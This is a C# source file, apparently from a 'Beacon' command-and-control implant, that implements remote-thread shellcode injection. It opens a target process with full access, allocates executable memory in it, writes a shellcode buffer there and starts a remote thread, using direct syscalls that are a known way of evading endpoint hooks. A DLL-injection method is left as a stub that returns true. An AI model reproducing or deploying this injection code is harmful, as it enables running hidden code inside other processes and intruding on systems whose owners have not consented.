using Beacon.Utils;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace Beacon.Core
{
    /// <summary>
    /// 注入相关（ShellcodeInjectr、DllInject、etc.）
    /// </summary>
    class Inject
    {

        public static bool CreateRemoteThreadInjectShellCode(int ProcessId,byte[] Shellcode)
        {
            IntPtr processHandle = new IntPtr();
            Native.OBJECT_ATTRIBUTES oa = new Native.OBJECT_ATTRIBUTES();
            Native.CLIENT_ID ci = new Native.CLIENT_ID();
            ci.UniqueProcess = (IntPtr)ProcessId;

            Native.NTSTATUS result = Native.NTSTATUS.Unsuccessful;
            result = Syscalls.NtOpenProcess(
                ref processHandle,
                Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci
                );
            if (result != Native.NTSTATUS.Success)
            {
#if DEBUG
                Console.WriteLine("[!] SCInject NtOpenProcess Failed. ");
#endif
                return false;
            }


            IntPtr regionSize = new IntPtr(Shellcode.Length +1);
            IntPtr pBase = IntPtr.Zero;
            result = Syscalls.NtAllocateVirtualMemory(
                processHandle, 
                ref pBase, 
                IntPtr.Zero, 
                ref regionSize, 
                Win32.Kernel32.AllocationType.Commit | Win32.Kernel32.AllocationType.Reserve,
                Win32.WinNT.PAGE_EXECUTE_READWRITE);
            if (result != Native.NTSTATUS.Success)
            {
#if DEBUG
                Console.WriteLine("[!] SCInject NtAllocateVirtualMemory Failed. ");
#endif
                return false;
            }


            GCHandle handle = GCHandle.Alloc(Shellcode, GCHandleType.Pinned);
            IntPtr payloadPtr = handle.AddrOfPinnedObject(); 
            UInt32 BytesWritten = 0;
            result = Syscalls.NtWriteVirtualMemory(
                processHandle,
                pBase,
                payloadPtr,
                (uint)Shellcode.Length, 
                ref BytesWritten);
            if (result != Native.NTSTATUS.Success)
            {
#if DEBUG
                Console.WriteLine("[!] SCInject NtWriteVirtualMemory Failed. ");
#endif
                return false;
            }


            IntPtr hRemoteThread = IntPtr.Zero;
            result = Syscalls.NtCreateThreadEx(
                    ref hRemoteThread,
                    Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL,
                    IntPtr.Zero,
                    processHandle,
                    pBase, 
                    IntPtr.Zero,
                    false,
                    0, 
                    0, 
                    0, 
                    IntPtr.Zero
                );
            if (result != Native.NTSTATUS.Success)
            {
#if DEBUG
                Console.WriteLine("[!] SCInject NtCreateThreadEx Failed. ");
#endif
                return false;
            }

            return true;
        }


        public static bool CreateRemoteThreadInjectDll(int ProcessId, byte[] Dll)
        {
            //TODO
            return true;
        }
    }
}
